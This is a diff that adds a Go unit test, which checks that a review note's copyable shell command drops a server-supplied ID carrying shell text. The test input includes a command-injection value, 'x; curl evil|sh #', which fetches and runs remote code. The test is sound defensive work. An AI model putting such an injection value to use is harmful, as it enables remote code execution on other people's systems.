@@ -749,3 +749,15 @@ Location: whole_change
 
 `)
 }
+
+// The note's command is copied and run, so a server ID carrying shell text
+// never reaches it.
+func TestTrailReviewPatchAlteredNoteKeepsShellTextOut(t *testing.T) {
+	t.Parallel()
+	if _, cmd := trailReviewPatchAlteredNote("01M63Q23WNMWAAAAAAAAAAAAAA"); cmd != "entire trail finding show 01M63Q23WNMWAAAAAAAAAAAAAA --json" {
+		t.Fatalf("plain ID command = %q", cmd)
+	}
+	if _, cmd := trailReviewPatchAlteredNote("x; curl evil|sh #"); cmd != "entire trail finding show <finding-id> --json" {
+		t.Fatalf("hostile ID command = %q", cmd)
+	}
+}
